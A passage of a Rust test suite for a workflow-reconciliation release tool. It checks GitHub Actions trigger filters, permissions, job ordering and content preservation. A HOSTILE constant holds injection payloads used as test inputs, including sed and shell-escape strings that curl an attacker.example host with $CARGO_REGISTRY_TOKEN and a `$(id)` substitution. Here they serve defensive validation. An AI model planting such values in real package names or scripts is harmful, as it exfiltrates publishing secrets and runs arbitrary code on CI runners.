                &format!(
                    "name: publish\non:\n  push:\n    {include}:\n      - sample/**\n    {exclude}:\n      - excluded/**\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n"
                ),
            );

            let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                .expect("comparison");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            let diagnostic = comparison
                .diagnostics
                .iter()
                .find(|diagnostic| diagnostic.code == "trigger-filter-conflict")
                .expect("the incompatible emitted filter pair is reported");
            let expected_path = format!("on.push.{include}");
            assert_eq!(diagnostic.path.as_deref(), Some(expected_path.as_str()));
            assert!(
                comparison.apply().is_err(),
                "an unloadable workflow is never written"
            );
        }
    }

    #[test]
    fn refuses_negative_only_push_include_filters() {
        for (include, _) in PUSH_FILTER_FAMILIES {
            let workspace = workspace(&format!("workflow-negative-only-{include}"));
            workspace.write(
                ".github/workflows/release.yml",
                &format!(
                    "name: release\non:\n  push:\n    {include}:\n      - '!excluded/**'\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n"
                ),
            );

            let comparison = compare_workflow(workspace.root(), WorkflowRole::Release, None)
                .expect("comparison");
            assert_eq!(comparison.status, ComparisonStatus::Blocked);
            let diagnostic = comparison
                .diagnostics
                .iter()
                .find(|diagnostic| diagnostic.code == "trigger-filter-positive-missing")
                .expect("the negative-only emitted filter is reported");
            let expected_path = format!("on.push.{include}");
            assert_eq!(diagnostic.path.as_deref(), Some(expected_path.as_str()));
            assert!(
                comparison.apply().is_err(),
                "a workflow GitHub refuses is never written"
            );
        }
    }

    #[test]
    fn refuses_a_non_sequence_owned_tag_filter() {
        let workspace = workspace("workflow-scalar-owned-tags");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n    tags: 'v*'\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );

        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        let diagnostic = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "trigger-filter-shape-invalid")
            .expect("the scalar owned tag filter is reported");
        assert_eq!(diagnostic.path.as_deref(), Some("on.push.tags"));
        assert!(
            comparison.apply().is_err(),
            "a scalar owned tag filter is never treated as a carried contract"
        );
    }

    #[test]
    fn distinguishes_an_unhandled_filter_shape_from_a_satisfied_contract() {
        let required = Value::Sequence(vec![Value::String("v*".to_owned())]);
        assert!(
            trigger_update(Some(&Value::String("v*".to_owned())), &required).is_err(),
            "an unhandled shape is not reported as a satisfied contract"
        );
        assert_eq!(
            trigger_update(Some(&required), &required),
            Ok(None),
            "an exact filter sequence already satisfies the contract"
        );
    }

    #[test]
    fn refuses_invalid_repository_push_filter_shapes_outside_the_managed_trigger_slice() {
        for (include, exclude) in PUSH_FILTER_FAMILIES {
            for filter in [include, exclude] {
                for (shape, value) in [("scalar", "sample/**"), ("member", "[ sample/**, 1 ]")] {
                    let workspace = workspace(&format!("workflow-{shape}-{filter}"));
                    workspace.write(
                        ".github/workflows/release.yml",
                        &format!(
                            "name: release\non:\n  push:\n    {filter}: {value}\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n"
                        ),
                    );

                    let comparison =
                        compare_workflow(workspace.root(), WorkflowRole::Release, None)
                            .expect("comparison");
                    assert_eq!(comparison.status, ComparisonStatus::Blocked);
                    let diagnostic = comparison
                        .diagnostics
                        .iter()
                        .find(|diagnostic| diagnostic.code == "trigger-filter-shape-invalid")
                        .expect("the invalid filter shape is reported");
                    let expected_path = format!("on.push.{filter}");
                    assert_eq!(diagnostic.path.as_deref(), Some(expected_path.as_str()));
                    assert!(
                        comparison.apply().is_err(),
                        "an invalid {shape} shape for {filter} is never written"
                    );
                }
            }
        }
    }

    #[test]
    fn excludes_phase_tags_from_the_publish_trigger() {
        let workspace = workspace("workflow-publish-phase-tag-exclusion");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n    tags:\n      - '!component@*'\n      - 'component@*'\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");
        let patterns = document["on"]["push"]["tags"]
            .as_sequence()
            .expect("tag filters");

        let config = Config::load(workspace.root()).expect("config loads");
        let phase_tags = phased_tag_templates(&config)
            .into_iter()
            .map(|template| template.replace("{version}", "1.2.3"))
            .collect::<Vec<_>>();
        assert!(!phase_tags.is_empty(), "the fixture declares phase tags");
        for phase_tag in phase_tags {
            assert!(
                !github_tag_filters_match(patterns, &phase_tag),
                "phase tag {phase_tag} cannot start another publication run: {patterns:?}"
            );
        }
        assert!(
            github_tag_filters_match(patterns, "1.2.3"),
            "the annotated global release tag still starts publication: {patterns:?}"
        );
    }

    #[test]
    fn keeps_an_effective_repository_phase_exclusion_without_duplicating_it() {
        let workspace = workspace("workflow-publish-existing-phase-exclusion");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n    tags:\n      - '*'\n      - '!component@*'\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");
        let patterns = document["on"]["push"]["tags"]
            .as_sequence()
            .expect("tag filters");

        assert_eq!(
            patterns
                .iter()
                .filter(|pattern| pattern.as_str() == Some("!component@*"))
                .count(),
            1,
            "an exclusion that remains effective is not repeated"
        );
        assert!(
            !github_tag_filters_match(patterns, "component@1.2.3"),
            "the existing exclusion remains effective"
        );
    }

    #[test]
    fn refuses_a_phase_tag_template_its_derived_exclusion_does_not_cover() {
        let workspace = workspace("workflow-phase-tag-glob-overlap");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace(
                "template: '{id}@{version}'",
                "template: '[sample]@{version}'",
            ),
        );

        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        let diagnostic = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "phase-tag-trigger-overlap")
            .expect("the phase-tag glob overlap is reported");
        assert_eq!(diagnostic.path.as_deref(), Some("on.push.tags"));
    }

    #[test]
    fn refuses_to_derive_dependencies_on_missing_configured_gates() {
        let workspace = workspace("workflow-missing-gate");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non: { workflow_dispatch: {} }\njobs:\n  another_check:\n    runs-on: ubuntu-latest\n    steps: [ { run: 'true' } ]\n",
        );

        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        let diagnostic = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "configured-gate-missing")
            .expect("the missing gate is reported by comparison");
        assert_eq!(diagnostic.path.as_deref(), Some("jobs.candidate_check"));
        assert!(
            comparison.apply().is_err(),
            "a transformation with an unknown needs target cannot be applied"
        );
    }

    #[test]
    fn states_the_release_tag_requirement_in_every_managed_checkout() {
        let workspace = workspace("workflow-fetch-tags");
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            let document: Value =
                serde_yaml::from_str(&workflow(workspace.root(), role)).expect("result parses");
            let jobs = document["jobs"].as_mapping().expect("jobs");
            let mut checkouts = 0;
            for (id, body) in jobs {
                let Some(id) = id.as_str().filter(|id| id.starts_with("intentional_")) else {
                    continue;
                };
                for step in body["steps"].as_sequence().expect("steps") {
                    if step
                        .get("uses")
                        .and_then(Value::as_str)
                        .is_some_and(|uses| uses.starts_with("actions/checkout@"))
                    {
                        checkouts += 1;
                        assert_eq!(
                            step["with"]["fetch-tags"].as_bool(),
                            Some(true),
                            "{id} states its release-tag requirement rather than inheriting it"
                        );
                        assert_eq!(
                            step["with"]["fetch-depth"].as_u64(),
                            Some(0),
                            "{id} carries the history the release-tag requirement depends on"
                        );
                    }
                }
            }
            assert!(
                checkouts > 0,
                "the {role} workflow checks out in managed jobs"
            );
        }
    }

    #[test]
    fn reports_the_permission_scopes_the_safe_default_drops() {
        let workspace = workspace("workflow-permissions");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non:\n  workflow_dispatch:\npermissions:\n  contents: read\n  id-token: write\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Different);
        let advisory = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "permissions-narrowed")
            .expect("the dropped scope is reported before the user applies it");
        assert!(
            advisory.message.contains("id-token: write"),
            "the advisory names the dropped scope: {}",
            advisory.message
        );
        assert_eq!(advisory.path.as_deref(), Some("permissions"));

        // An already-safe default is left alone and reported as nothing.
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non:\n  workflow_dispatch:\npermissions:\n  contents: read\n  actions: read\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert!(
            comparison.diagnostics.is_empty(),
            "a read-only default is preserved without comment: {:?}",
            comparison.diagnostics
        );
    }

    #[test]
    fn refuses_a_transformation_that_does_not_carry_the_contract() {
        let workspace = workspace("workflow-postcondition");
        let config = Config::load(workspace.root()).expect("config loads");
        let namespaces = config
            .github
            .as_ref()
            .expect("github config")
            .namespaces()
            .expect("namespaces");
        let contract = release_contract(&namespaces, &[]).expect("contract derives");
        let text = std::fs::read_to_string(workspace.root().join(".github/workflows/release.yml"))
            .expect("workflow readable");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");

        let mut parsed: Value = serde_yaml::from_str(&output).expect("output parses");
        carries_contract(&parsed, &contract).expect("the real transformation carries the contract");

        // A splicer defect that emits well-formed YAML in the wrong place looks
        // exactly like this to the post-condition.
        parsed["jobs"]
            .as_mapping_mut()
            .expect("jobs mapping")
            .remove(Value::String("intentional_prepare".to_owned()));
        let diagnostic =
            carries_contract(&parsed, &contract).expect_err("a missing managed job is refused");
        assert_eq!(diagnostic.code, "transformation-invalid");
        assert_eq!(diagnostic.path.as_deref(), Some("jobs.intentional_prepare"));
    }

    #[test]
    fn refuses_a_transformation_that_discards_repository_owned_content() {
        let workspace = workspace("workflow-preservation");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non:\n  workflow_dispatch:\n  schedule:\n    - cron: '0 0 * * *'\nenv:\n  REPOSITORY_SETTING: kept\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let config = Config::load(workspace.root()).expect("config loads");
        let namespaces = config
            .github
            .as_ref()
            .expect("github config")
            .namespaces()
            .expect("namespaces");
        let contract = release_contract(&namespaces, &["candidate_check".to_owned()])
            .expect("contract derives");
        let text = std::fs::read_to_string(workspace.root().join(".github/workflows/release.yml"))
            .expect("workflow readable");
        let input: Value = serde_yaml::from_str(&text).expect("input parses");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");
        let parsed: Value = serde_yaml::from_str(&output).expect("output parses");
        preserves_repository_content(&input, &parsed, &contract)
            .expect("the real transformation preserves repository content");

        // Each of these is what a splice that damaged only repository-owned
        // content would look like; the contract check cannot see any of them.
        for (location, damage) in [
            ("jobs.candidate_check", "jobs"),
            ("on.schedule", "on"),
            ("env", "env"),
        ] {
            let mut damaged = parsed.clone();
            let mapping = damaged.as_mapping_mut().expect("top level");
            if damage == "env" {
                mapping.remove(Value::String("env".to_owned()));
            } else {
                let key = location.split('.').nth(1).expect("damaged key");
                mapping[&Value::String(damage.to_owned())]
                    .as_mapping_mut()
                    .expect("container")
                    .remove(Value::String(key.to_owned()));
            }
            let diagnostic = preserves_repository_content(&input, &damaged, &contract)
                .expect_err("discarded repository content is refused");
            assert_eq!(diagnostic.code, "transformation-invalid");
            assert_eq!(diagnostic.path.as_deref(), Some(location));
        }

        // A reserved job is Intentional's to retire, so removing one is not a
        // loss of repository-owned content.
        let mut retired = parsed.clone();
        retired["jobs"]
            .as_mapping_mut()
            .expect("jobs")
            .remove(Value::String("intentional_prepare".to_owned()));
        preserves_repository_content(&input, &retired, &contract)
            .expect("retiring a reserved job is not repository-content loss");
    }

    #[test]
    fn proves_repository_owned_push_filters_survive_the_owned_tag_update() {
        let workspace = workspace("workflow-push-preservation");
        workspace.write(
            ".github/workflows/publish.yml",
            "name: publish\non:\n  push:\n    branches: [ main ]\n    tags: [ 'legacy-*' ]\njobs:\n  artifact_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let config = Config::load(workspace.root()).expect("config loads");
        let github = config.github.as_ref().expect("github config");
        let namespaces = github.namespaces().expect("namespaces");
        let contract = publish_contract(
            workspace.root(),
            &config,
            github,
            &namespaces,
            &["artifact_check".to_owned()],
        )
        .expect("contract derives");
        let text = workflow(workspace.root(), WorkflowRole::Publish);
        let input: Value = serde_yaml::from_str(&text).expect("input parses");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");
        let parsed: Value = serde_yaml::from_str(&output).expect("output parses");
        preserves_repository_content(&input, &parsed, &contract)
            .expect("the complete push mapping survives the owned update");

        for field in ["branches", "tags"] {
            let mut damaged = parsed.clone();
            let filters = damaged["on"]["push"]
                .as_mapping_mut()
                .expect("push filters");
            if field == "tags" {
                filters[&Value::String(field.to_owned())]
                    .as_sequence_mut()
                    .expect("tag filters")
                    .retain(|pattern| pattern.as_str() != Some("legacy-*"));
            } else {
                filters.remove(Value::String(field.to_owned()));
            }
            let diagnostic = preserves_repository_content(&input, &damaged, &contract)
                .expect_err("lost push-filter content is refused");
            let expected_path = format!("on.push.{field}");
            assert_eq!(diagnostic.path.as_deref(), Some(expected_path.as_str()));
        }
    }

    #[test]
    fn proves_repository_owned_path_filters_survive_an_unrelated_trigger_update() {
        let workspace = workspace("workflow-release-path-preservation");
        workspace.write(
            ".github/workflows/release.yml",
            "name: release\non:\n  push:\n    paths: [ 'sample/**' ]\njobs:\n  candidate_check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
        );
        let config = Config::load(workspace.root()).expect("config loads");
        let github = config.github.as_ref().expect("github config");
        let namespaces = github.namespaces().expect("namespaces");
        let contract = release_contract(&namespaces, &["candidate_check".to_owned()])
            .expect("contract derives");
        let text = workflow(workspace.root(), WorkflowRole::Release);
        let input: Value = serde_yaml::from_str(&text).expect("input parses");
        let (output, _) =
            reconcile(Document::parse(&text).expect("parses"), &contract).expect("reconciles");
        let mut damaged: Value = serde_yaml::from_str(&output).expect("output parses");
        damaged["on"]["push"]
            .as_mapping_mut()
            .expect("push filters")
            .remove(Value::String("paths".to_owned()));

        let diagnostic = preserves_repository_content(&input, &damaged, &contract)
            .expect_err("lost repository path filter is refused");
        assert_eq!(diagnostic.path.as_deref(), Some("on.push"));
    }

    #[test]
    fn orders_closure_after_tag_verification_without_any_publication() {
        let workspace = workspace("workflow-zero-publications");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace(
                "    packages:\n      package:\n        path: .\n        cargo: { registry: {} }\n",
                "",
            ),
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let document: Value =
            serde_yaml::from_str(&workflow(workspace.root(), WorkflowRole::Publish))
                .expect("result parses");
        let jobs = document["jobs"].as_mapping().expect("jobs");

        let needs = |id: &str| {
            jobs[&Value::String(id.to_owned())]["needs"]
                .as_sequence()
                .expect("needs")
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_owned)
                .collect::<Vec<_>>()
        };
        assert!(
            needs("intentional_assemble_evidence").contains(&"intentional_verify_tag".to_owned()),
            "tag verification dominates the graph even with no publication to publish"
        );
        assert!(
            needs("intentional_close_release")
                .contains(&"intentional_assemble_evidence".to_owned()),
            "closure stays downstream of assembly"
        );
        assert!(
            needs("intentional_assemble_evidence").contains(&"artifact_check".to_owned()),
            "the configured publish gate precedes assembly"
        );
    }

    #[test]
    fn blocks_publication_without_a_configured_global_release_tag() {
        let workspace = workspace("workflow-no-tag");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace(
                "workspace-tags:\n  release:\n    template: '{version}'\n",
                "",
            ),
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "release-tag-undefined");
        assert_eq!(
            comparison.diagnostics[0].path.as_deref(),
            Some("workspace-tags")
        );
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("no workspace tag omits require-phase"),
            "{}",
            comparison.diagnostics[0].message
        );
        assert!(comparison.output_digest.is_none());
    }

    #[test]
    fn blocks_publication_when_multiple_workspace_tags_omit_require_phase() {
        let workspace = workspace("workflow-multi-workspace-tag");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace(
                "workspace-tags:\n  release:\n    template: '{version}'\n",
                "workspace-tags:\n  mirror:\n    template: '{version}-mirror'\n  release:\n    template: '{version}'\n",
            ),
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics.len(), 1);
        assert_eq!(comparison.diagnostics[0].code, "release-tag-undefined");
        assert_eq!(
            comparison.diagnostics[0].path.as_deref(),
            Some("workspace-tags")
        );
        assert!(
            comparison.diagnostics[0].message.contains(
                "2 workspace tags omit require-phase: workspace/mirror, workspace/release"
            ),
            "{}",
            comparison.diagnostics[0].message
        );
        assert!(comparison.output_digest.is_none());
    }

    #[test]
    fn blocks_publication_when_only_a_release_unit_tag_omits_require_phase() {
        let workspace = workspace("workflow-release-unit-tag");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG
                .replace(
                    "workspace-tags:\n  release:\n    template: '{version}'\n",
                    "",
                )
                .replace("require-phase: after-publication", ""),
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics.len(), 2);
        assert_eq!(comparison.diagnostics[0].code, "release-tag-undefined");
        assert_eq!(
            comparison.diagnostics[0].path.as_deref(),
            Some("workspace-tags")
        );
        assert!(
            comparison.diagnostics[0]
                .message
                .contains("no workspace tag omits require-phase"),
            "{}",
            comparison.diagnostics[0].message
        );
        assert_eq!(comparison.diagnostics[1].code, "release-tag-undefined");
        assert_eq!(
            comparison.diagnostics[1].path.as_deref(),
            Some("release-units")
        );
        assert!(
            comparison.diagnostics[1]
                .message
                .contains("release-unit/component/primary"),
            "{}",
            comparison.diagnostics[1].message
        );
    }

    #[test]
    fn blocks_when_two_publications_claim_one_managed_job_identifier() {
        let workspace = workspace("workflow-collision");
        workspace
            .write(
                ".intentional/config.yml",
                &CONFIG.replace(
                    "release-units:\n  component:\n",
                    "release-units:\n  component.one:\n    path: one\n    packages:\n      package:\n        path: .\n        cargo: { registry: {} }\n    tags:\n      primary: { role: primary, template: 'one@{version}', require-phase: after-publication }\n  component_one:\n",
                ),
            )
            .write(
                "one/Cargo.toml",
                "[package]\nname = \"example-one\"\nversion = \"1.0.0\"\n",
            );
        std::fs::rename(
            workspace.root().join("component"),
            workspace.root().join("component_one"),
        )
        .ok();
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        assert_eq!(comparison.diagnostics[0].code, "job-identifier-collision");
    }

    /// Every value a maintained recipe reads out of the repository it releases.
    ///
    /// This is the list the boundary rule is written against, so it is written
    /// down rather than inferred: each entry is a place a repository author
    /// types a name that derivation then puts into a script, a document or a
    /// command line. Fixing one of them per sink is what let the first
    /// injection be closed for the registry name while the package name walked
    /// through the same gap into a `sed` address; the answer is to hold every
    /// entry to the same rule and to keep the list where a new entry has to
    /// join it.
    const REPOSITORY_SUPPLIED: [(&str, &str, &str); 6] = [
        (
            "component/Cargo.toml",
            "[package]\nname = \"@VALUE@\"\nversion = \"1.0.0\"\n",
            "subject-identity-invalid",
        ),
        (
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"@VALUE@\"]\n",
            "recipe-underivable",
        ),
        (
            "component/package.json",
            r#"{"name":"@VALUE@","version":"1.0.0"}"#,
            "subject-identity-invalid",
        ),
        (
            ".intentional/config.yml",
            "@RELEASE_UNIT@",
            "subject-identity-invalid",
        ),
        (
            ".intentional/config.yml",
            "@TOKEN_SECRET@",
            "recipe-underivable",
        ),
        (
            ".cargo/config.toml",
            "[registries.example-registry]\nindex = \"@VALUE@\"\n",
            "recipe-underivable",
        ),
    ];

    /// Values the workspace admits and the publication boundary must refuse.
    ///
    /// The hostile shapes below are refused by the configuration loader long
    /// before derivation, so a roster entry driven only by them proves nothing
    /// about the boundary: the entry passes with the boundary's own validator
    /// deleted. These are the shapes that reach it -- legal workspace
    /// identifiers whose punctuation a recipe's sinks cannot carry.
    const NARROWED: [&str; 2] = ["example-owner/component", "-rf"];

    /// Values that are executable text, or that reshape a document, at a sink.
    ///
    /// The first two are the review's own reproductions, kept verbatim. The
    /// `sed` one is the sharp case: it is correctly `env:`-routed and correctly
    /// quoted, and GNU `sed`'s `e` command executes it anyway, because quoting
    /// a value into a shell command does not stop the command from
    /// interpreting it.
    const HOSTILE: [&str; 4] = [
        r#"a\"$/e echo PWNED; sh -c 'curl http://attacker.example/$CARGO_REGISTRY_TOKEN' #"#,
        "a\"; curl http://attacker.example/$CARGO_REGISTRY_TOKEN; #",
        "a\nname",
        "a$(id)",
    ];

    /// A workspace whose every repository-supplied value is distinctive.
    ///
    /// Each value below is one an author types and derivation then carries into
    /// a workflow. They are legal names, deliberately: the boundary refuses the
    /// hostile ones, and this fixture is about where the accepted ones end up.
    fn sentinel_workspace(label: &str, prefix: Option<&str>) -> Workspace {
        let workspace = Workspace::new(label);
        let configured = prefix.map_or_else(String::new, |prefix| format!("  prefix: {prefix}\n"));
        workspace
            .write(
                ".intentional/config.yml",
                &SENTINEL_CONFIG.replace("@PREFIX@\n", &configured),
            )
            .write(
                ".cargo/config.toml",
                "[registries.mtdlgw]\nindex = \"sparse+https://jvnqsx.example/idx/\"\n",
            )
            .write(
                "vkjmtd/package.json",
                r#"{"name":"@kfnrbg/pxwqld","version":"1.0.0"}"#,
            )
            .write(
                "bgqnwt/Dockerfile",
                "FROM scratch\nLABEL org.opencontainers.image.title=\"gwlqcx\"\n",
            )
            .write(
                "kdshpm/devcontainer-feature.json",
                r#"{"id":"nfxkbd","version":"1.0.0"}"#,
            )
            // The Go release unit is what puts a GoReleaser build body, a
            // Homebrew promote body and an AUR promote body in front of the
            // sweep. Without it the gate reads four of the six packagers and
            // reports clean over the two it never derived.
            .write("xnrjgb/go.mod", "module vhzmlk.example/svqtwm\n")
            .write(
                "xnrjgb/cmd/svqtwm/main.go",
                "package main\n\nfunc main() {}\n",
            )
            .write("xnrjgb/.goreleaser.yaml", SENTINEL_GORELEASER)
            .write(
                "vkjmtd/Cargo.toml",
                "[package]\nname = \"hbzqvn\"\nversion = \"1.0.0\"\npublish = [\"mtdlgw\"]\n",
            )
            .write("vkjmtd/src/main.rs", "fn main() {}\n")
            .write(".github/workflows/release.yml", REPOSITORY_RELEASE_WORKFLOW)
            .write(
                ".github/workflows/publish.yml",
                &format!(
                    "{REPOSITORY_PUBLISH_WORKFLOW}  wzrjkd:\n    runs-on: ubuntu-latest\n    steps: [ {{ run: 'true' }} ]\n"
                ),
            );
        workspace
    }

    /// Native GoReleaser configuration whose every author-typed value is distinctive.
    ///
    /// `archlinux` is declared for a reason the roster below states: it is the
    /// one nfpm format whose package does not carry the format's own name, so
    /// it is the only declared format that can witness the difference between a
    /// value the derivation maps to a literal it owns and a value it passes
    /// through. `rpm` and `deb` would satisfy either.
    const SENTINEL_GORELEASER: &str = r#"version: 2
project_name: svqtwm
builds:
  - main: ./cmd/svqtwm
brews:
  - repository: { owner: zlfrhd, name: cbnwvk }
nfpms:
  - formats: [ rpm, deb, archlinux ]
aur:
  - name: jgtxpz
"#;

    /// Configuration whose every author-typed value is distinctive.
    const SENTINEL_CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-2
workspace-tags:
  release:
    template: 'tzbrmk{version}dnwlpq'
github:
@PREFIX@
  workflows:
    release: { path: .github/workflows/release.yml }
    publish: { path: .github/workflows/publish.yml, gates: [ wzrjkd ] }
discovery:
  managed-paths:
    - detector: npm-package
      path: vkjmtd/package.json
      release-unit: qhwzru
      package: node
    - detector: cargo-package
      path: vkjmtd/Cargo.toml
      release-unit: qhwzru
      package: rust
release-units:
  jdmcvx:
    path: bgqnwt
    packages:
      package:
        path: .
        oci:
          dockerhub:
            repository: zrpvhm/phqvrb
            username-var: KLXVBRQ
            token-secret: WZDNGPT
          ghcr:
            repository: mwbqjt/nkwzdt
            omit: [ signature ]
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
  rtwzlf:
    path: kdshpm
    packages:
      package:
        path: .
        oci:
          ghcr: {}
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
  wpdklc:
    path: xnrjgb
    packages:
      package:
        path: .
        homebrew: { repository: zlfrhd/cbnwvk }
        aur: {}
    tags:
      staged:
        role: primary
        template: '{id}/hqvzdn@{version}'
        require-phase: before-publication
  qhwzru:
    path: vkjmtd
    packages:
      node:
        path: .
        npm:
          npmjs:
            token-secret: KQVBZTLM
          github: {}
      rust:
        path: .
        cargo:
          registry:
            token-secret: HGWRXPFD
        homebrew: { repository: zlfrhd/cbnwvk }
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
      published:
        role: projection
        template: '{id}/published@{version}'
        require-phase: after-publication
"#;

    /// Where one repository-supplied value legitimately lands.
    ///
    /// Naming the surface is what stops this gate's prose from claiming more
    /// than it checks. Without it the gate says "no value is spliced" while
    /// only ever having looked at one kind of place, and a value that moved
    /// from a `with:` input into an expression would satisfy it unchanged.
    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum Surface {
        /// A workflow expression: a `${{ ... }}` the runner evaluates.
        Expression,
        /// Anything else a managed job carries that is not shell: job
        /// identifiers, step names, `env:` values, `with:` inputs.
        Plain,
    }

    /// Every value the sentinel workspace supplies, where an author types it,
    /// and the surface it is expected to land on.
    ///
    /// This is the roster the gate below reads. Its purpose is that a new value
    /// entering derivation has to join it, so it is a list rather than a
    /// pattern: a pattern would quietly cover a route nobody had considered,
    /// which is exactly what happened four times in this task. That the list is
    /// hand-maintained is a real limitation and epic task 180 owns converting
    /// it to something machine-established; the conversion has to enumerate the
    /// derivation's repository-read sites rather than a fixture's values, or it
    /// reintroduces the pattern this avoids.
    ///
    /// **The roster covers all six packagers.** The sentinel configuration
    /// derives npm, Cargo, both OCI destinations and a GoReleaser publication,
    /// so the sweep reads Homebrew and AUR promote bodies as well. That the
    /// last two were absent was not a stated limit doing its job: three Go
    /// values were routed correctly and nothing had ever looked at them, and a
    /// fourth reached the AUR clone URL registered on no roster at all, which a
    /// human noticed and no gate did.
    ///
    /// Two values are supplied and read and still hold no row, and they are
    /// written down in `ABSENT_FROM_MANAGED_CONTENT` rather than left out,
    /// because "no row" is also what an unnoticed value looks like. So is a
    /// value closed at its boundary, in `CLOSED_AT_THE_BOUNDARY`.
    ///
    /// Each row carries a token as well as a value, and the gate rejects both
    /// the folded value and any four-character window of the token, forwards or
    /// reversed. Two different transforms are covered by those two checks and
    /// it is worth being exact about which, because the wrong generalisation
    /// here propagates to every copy of this gate.
    ///
    /// A case-folded substring recognises a value carried verbatim or
    /// case-transformed, and nothing else. It does not recognise truncation,
    /// windowing or reversal: those keep a run of the value without keeping the
    /// value, and a check anchored on the whole value passes over them. That is
    /// what the window check is for. It is not a general answer either. Both
    /// checks look for a run of the value's own characters, so a transform that
    /// **re-alphabets** the value leaves neither of them anything to find.
    ///
    /// **Percent-encoding is the re-alphabeting case to expect, and it has a
    /// live route.** A recipe that builds a registry path or an API URL out of
    /// a repository-supplied name has every reason to encode it, and an encoded
    /// name is still executable text: `%3B` decodes at the far end, and the
    /// characters that make encoding necessary are exactly the ones that make
    /// splicing dangerous. The sentinel values are alphanumeric, so encoding
    /// them is the identity and no fixture here can witness the gap. What is
    /// owed when a recipe starts encoding is therefore stated rather than
    /// checked: encode at the boundary and roster the encoded form as its own
    /// row -- the same answer the npm scope and the uppercased variable
    /// spelling already take -- or route the value through `env:` so the
    /// encoding happens on the runner and no spelling reaches the text at all.
    /// A hash is the other re-alphabeting transform, and it is safe for the
    /// opposite reason: its output carries none of the value's characters, so
    /// there is nothing left to interpret.
    ///
    /// Both checks depend on the token being opaque. A window of a token
    /// spelled from the derivation's own vocabulary collides with the
    /// derivation, so the tokens here are deliberately meaningless: `unit` is a
    /// window of a release unit named `sentinelunit`, and it is also in every
    /// script that reads a prefixed release-unit variable.
    ///
    /// This derivation applies three transforms whose outputs a value-anchored
    /// check would not see: the npm scope is a path-component split of the
